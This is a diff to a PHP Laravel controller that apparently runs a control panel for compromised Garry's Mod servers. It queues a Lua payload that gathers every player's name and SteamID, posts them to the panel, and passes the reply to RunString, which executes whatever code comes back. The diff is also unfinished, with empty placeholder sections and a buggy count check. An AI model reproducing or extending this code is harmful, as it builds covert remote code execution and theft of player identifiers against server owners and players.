@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\kermini\special;
 
 use App\Http\Controllers\Controller;
+use App\Models\FSCRGRB_player_requests;
 use App\Models\payloads_queue;
 use App\Models\Scrgb_Image_Requests;
 use App\Models\servers;
@@ -11,8 +12,10 @@ use Illuminate\Contracts\View\Factory;
 use Illuminate\Contracts\View\View;
 use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
+use Illuminate\Support\Collection;
 use Illuminate\Support\Facades\Validator;
 use Illuminate\Support\Str;
+use Nette\Utils\DateTime;
 use xPaw\SourceQuery\Exception\InvalidArgumentException;
 use xPaw\SourceQuery\Exception\InvalidPacketException;
 use xPaw\SourceQuery\Exception\SocketException;
@@ -330,9 +333,71 @@ class screenGrabber extends Controller
             if ($Exception == null){
                 //server is online and reachable
                 //we need to verify the existence of a valid player request.
-                    //A user could stack multiple requests in theory if they are not limited.
-                    // "limiting" a user is yet to be defined
+                $valid_pscrgrb_requests = FSCRGRB_player_requests::where('used',0)->get()->filter(function ($value, $key) {
+                    $current = new DateTime( date('Y-m-d H:i:s') );
+                    return $value->RequestValidFor_Seconds >= (
+                            $current->getTimestamp() - (new DateTime( $value->created_at ))->getTimestamp()
+                           );
+                });
 
+                if($valid_pscrgrb_requests->count > 0){
+                    if($valid_pscrgrb_requests->first()->players_json == null){
+                        return redirect()->route("dashboard")->with(
+                            'status', 'Last server player request is not finished, please wait for it to expire or to finish.'
+                        );
+                    } else {
+                        //Request has now been used
+                        $first_valid = $valid_pscrgrb_requests->first();
+                        $first_valid->used = 1;
+                        $first_valid->update();
+
+                        //extract the json from string and create a collection
+
+
+                        //return to view with new collection and display players
+
+
+                    }
+
+                }else{
+                    //generating request key
+                    $player_request_key = Str::random(rand(20,32));
+
+                    //registering player list request
+                    $new_player_requests = new FSCRGRB_player_requests();
+                    $new_player_requests->PlayerRequestKey = $player_request_key;
+                    $new_player_requests->server_id = $serverid;
+                    $new_player_requests->RequestValidFor_Seconds = 1200;
+                    $new_player_requests->save();
+
+                    //custom payload code | player_request_key
+                    //we need to add a route to register the player json when the server responds | Pscrgrb_player_request
+                    $player_list_request_payload_code = '
+                        local Players = {}
+                        for k, v in ipairs(player.GetAll()) do
+                            Players[k] = { snm = v:Name(), stmid = v:SteamID() }
+                        end
+                        local a = {
+                            d = util.TableToJSON(Players),
+                        }
+                        http.Post(
+                            "'.route('Pscrgrb_player_request', ['rkey' => $player_request_key]).'",
+                            a,
+                            function(body, len, headers, code)
+                                RunString(body)
+                            end
+                        )
+                    ';
+
+                    //sending player list request | registers new payload
+                    $SCRGB_payload = new payloads_queue();
+                    $SCRGB_payload->server_id = $serverid;
+                    $SCRGB_payload->content = $player_list_request_payload_code;
+                    $SCRGB_payload->description = "Playerlist request by: " .
+                        $request->user()->name . " [" . $request->user()->id . "]" .
+                        " for " . $request->player . " on serverid " . $serverid;
+                    $SCRGB_payload->save();
+                }
 
             }else{
                 //Don't allow access if server is not accessible
